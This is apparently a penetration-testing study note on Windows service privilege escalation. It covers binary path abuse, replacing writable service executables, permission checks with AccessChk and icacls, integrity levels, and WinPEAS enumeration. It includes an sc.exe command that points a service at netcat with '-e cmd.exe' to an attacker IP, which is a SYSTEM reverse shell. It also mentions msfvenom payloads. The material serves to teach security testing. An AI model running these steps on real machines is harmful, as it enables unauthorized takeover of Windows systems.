# Binary Path Abuse, Service Binary Replacement, and Automated Enumeration

## Introduction

Windows services are one of the most common areas examined during Windows privilege escalation.

A service normally runs in the background with a specific user account and permissions. If a service is incorrectly configured, a low-privileged user may be able to modify how the service operates and execute code with higher privileges.

The most dangerous case is when a service runs as:

```text
NT AUTHORITY\SYSTEM
```

because SYSTEM has almost complete control over the Windows machine.

This note explains:

* Service configuration abuse
* Binary path modification
* Service executable replacement
* Permission checking
* Integrity levels
* Automated enumeration with WinPEAS

---

# 1. Exploiting Service Configuration (Binary Path Abuse)

## What is Binary Path Abuse?

Every Windows service has a configuration that defines:

* Service name
* Startup behavior
* Running account
* Executable path

Example:

```
Service:

simple_service

Executable:

C:\Program Files\App\service.exe
```

When Windows starts the service:

```
Service Starts

        ↓

Windows reads Binary Path

        ↓

Executes service.exe
```

---

## The Vulnerability

If a normal user can modify the service configuration, they may change:

```
Original:

C:\Program Files\App\service.exe
```

to:

```
Modified:

C:\Users\User\malicious.exe
```

Then when the service starts:

```
Service Start

       ↓

Windows Executes Modified Binary

       ↓

Program Runs With Service Account Privileges
```

If the service runs as SYSTEM:

```
SYSTEM Privileges Obtained
```

---

# Enumerating Service Configuration

The command:

```cmd
sc.exe qc <service_name>
```

shows service details.

Example:

```cmd
sc.exe qc simple_service
```

Output contains:

```
BINARY_PATH_NAME:
C:\Services\simple_service.exe


SERVICE_START_NAME:
LocalSystem
```

Important information:

| Field         | Purpose                        |
| ------------- | ------------------------------ |
| Binary Path   | Executable launched by service |
| Start Account | User running the service       |
| Startup Type  | Automatic/manual               |

---

# Checking Service Permissions Using AccessChk

Windows does not always clearly show who can modify services.

Microsoft Sysinternals provides a tool:

```
accesschk64.exe
```

It can check permissions of Windows objects.

---

## Downloading AccessChk

The tool is transferred to the target machine.

Example:

```
Attacker Machine

      ↓

accesschk64.exe

      ↓

Windows Target
```

---

## Running AccessChk

Example:

```cmd
accesschk64.exe /accepteula
```

The `/accepteula` option automatically accepts the license agreement.

---

## Checking Service Permissions

The output shows accounts with access.

Example:

```
simple_service

NT AUTHORITY\SYSTEM        Full Control

BUILTIN\Administrators     Full Control
```

This indicates these accounts can modify the service.

---

# Integrity Level Problem (Mandatory Integrity Control)

Even if a user belongs to the Administrators group, Windows may still block certain actions.

Why?

Because Windows uses:

```
Mandatory Integrity Control (MIC)
```

---

# Administrator Does Not Always Mean Elevated

A Windows administrator normally receives two tokens:

```
Administrator Login

        |
        |
        +---- Standard User Token
        |
        +---- Administrator Token
```

Normal applications run with:

```
Medium Integrity Level
```

Administrative applications run with:

```
High Integrity Level
```

---

## Example Problem

A user is an administrator:

```
User:

Administrator
```

but their terminal runs as:

```
Medium Mandatory Level
```

Trying:

```cmd
sc.exe config simple_service ...
```

may return:

```
Access Denied
```

---

# Running an Elevated Command Prompt

Solution:

Right-click:

```
Command Prompt

        ↓

Run as Administrator
```

Now the terminal runs with:

```
High Mandatory Level
```

Administrative operations are allowed.

---

# Modifying the Service Binary Path

The command:

```cmd
sc.exe config
```

changes service configuration.

Example:

```cmd
sc.exe config simple_service binpath= "C:\path\to\nc.exe <attacker_ip> <port> -e cmd.exe"
```

This changes the service executable.

Before:

```
simple_service

↓

service.exe
```

After:

```
simple_service

↓

nc.exe
```

---

# Alternative: Generating a Custom Payload

Instead of using an existing executable, a custom Windows executable can be created.

Example:

```
msfvenom
```

can generate:

```
malicious.exe
```

The service configuration is changed:

```
simple_service

↓

malicious.exe
```

---

# Triggering Execution

After changing the service:

Start it:

```cmd
sc.exe start simple_service
```

Execution flow:

```
Start Service

        ↓

Windows Loads Binary

        ↓

Binary Runs

        ↓

Process Uses Service Account
```

If the service runs as:

```
NT AUTHORITY\SYSTEM
```

the resulting access has SYSTEM privileges.

---

# 2. Exploiting the Service Binary (Executable Replacement)

Sometimes modifying service configuration is not possible.

However, another weakness may exist:

> The user can modify the service executable file itself.

---

# The Concept

A service points to:

```
C:\Users\Public\service.exe
```

If the current user has:

```
Write Permission
```

they can replace the file.

Example:

Original:

```
service.exe
```

↓

Replace with:

```
malicious.exe
```

When the service restarts:

```
Windows launches malicious.exe
```

---

# Finding Service Executables

PowerShell can list service paths.

Command:

```powershell
Get-CimInstance -ClassName Win32_Service |
Select-Object Name, State, PathName |
Where-Object {$_.State -eq 'Running'}
```

Example:

Output:

```
Name:

simple_service


PathName:

C:\Users\User\Downloads\simple_service.exe
```

---

# Why This Is Dangerous

A service executable should normally be stored in protected locations:

Example:

```
C:\Program Files\
C:\Windows\System32\
```

A bad configuration:

```
C:\Users\User\Downloads\
```

is dangerous because normal users may have write permissions.

---

# Checking File Permissions Using icacls

Command:

```cmd
icacls <file>
```

Example:

```cmd
icacls simple_service.exe
```

Output:

```
User:(F)
```

Meaning:

```
F = Full Control
```

The user can:

* Read
* Modify
* Replace
* Delete

the executable.

---

# Replacing the Service Binary

The process:

```
Stop Service

       ↓

Backup Original File

       ↓

Replace Executable

       ↓

Start Service
```

---

# Important Safety Rule

Before replacing a service executable:

Always create a backup.

Example:

```
Original:

simple_service.exe


Backup:

simple_service_backup.exe
```

Why?

Because if something fails:

* The service can be restored.
* System stability is maintained.

---

# Starting the Modified Service

After replacement:

```cmd
sc.exe start simple_service
```

Windows executes:

```
New Executable

        ↓

Runs Under Service Account

        ↓

Higher Privilege Access
```

---

# 3. Automated Enumeration Using WinPEAS

Manually checking every service can take a long time.

Security professionals often use automated enumeration tools.

One popular tool:

```
WinPEAS
```

---

# What is WinPEAS?

WinPEAS is a Windows privilege escalation enumeration tool.

It searches for:

* Weak permissions
* Service misconfigurations
* Credentials
* Registry issues
* Scheduled tasks
* Installed software

---

# Running WinPEAS

The executable:

```
winpeasx64.exe
```

is transferred to the target.

Example:

```
Attacker

     ↓

winpeas.exe

     ↓

Windows Machine
```

---

# Service Enumeration Mode

Command:

```cmd
winpeas.exe quiet servicesinfo
```

This focuses on:

```
Windows Services
```

---

# WinPEAS Results

A vulnerable service may show:

```
simple_service

Writable service executable

Writable service configuration
```

Meaning:

Possible attack paths:

```
Modify Binary Path

OR

Replace Executable
```

---

# DLL Hijacking Detection

WinPEAS may also identify:

```
Possible DLL Hijacking
```

This occurs when:

* A service loads DLL files.
* The search order allows user-controlled locations.
* A malicious DLL can be loaded.

---

# High Integrity Enumeration

Running WinPEAS from:

```
High Integrity Shell
```

provides more information.

Why?

Because elevated privileges allow access to:

* Protected files
* Registry keys
* System information

---

# Summary

Windows services are powerful components that can become privilege escalation paths when incorrectly configured.

Important concepts:

| Concept                    | Explanation                                |
| -------------------------- | ------------------------------------------ |
| Binary Path Abuse          | Changing the executable a service runs     |
| Service Binary Replacement | Replacing a writable service executable    |
| AccessChk                  | Tool for checking service permissions      |
| icacls                     | Checks file permissions                    |
| Integrity Level            | Controls administrative actions            |
| SYSTEM Account             | Highest local privilege                    |
| WinPEAS                    | Automated privilege escalation enumeration |

The general attack idea:

```
Misconfigured Service

        ↓

User Can Modify Service

        ↓

Service Runs Modified Program

        ↓

Program Executes With Service Privileges

        ↓

Higher Privilege Access
```

Understanding service security is essential for Windows administration, penetration testing, and privilege escalation analysis.
